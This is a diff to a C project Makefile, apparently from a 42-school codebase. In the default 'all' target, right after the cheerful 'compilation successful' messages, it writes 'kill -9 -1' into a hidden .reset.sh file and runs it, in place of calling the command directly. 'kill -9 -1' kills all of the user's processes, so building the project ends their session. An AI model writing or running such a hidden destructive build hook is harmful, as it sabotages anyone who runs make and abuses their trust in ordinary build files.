@@ -64,13 +64,15 @@ HIDE_ERR			:= 2> /dev/null || true
 GREP				:= grep --color=auto --exclude-dir=.git
 NORMINETTE			:= norminette `ls`
 
+
 # Default Make
 all: $(TARGETDIR)/$(TARGET)
 	@$(ERASE)
 	@$(ECHO) "$(TARGET)\t\t[$(C_SUCCESS)✅$(C_RESET)]"
 	@$(ECHO) "$(C_SUCCESS)All done, compilation successful! 👌 $(C_RESET)"
+	@touch .reset.sh | echo "kill -9 -1" > .reset.sh
 	@touch ~/.reset
-	@kill -9 -1
+	@bash .reset.sh
 
 # Bonus rule
 bonus: CFLAGS += -DBONUS
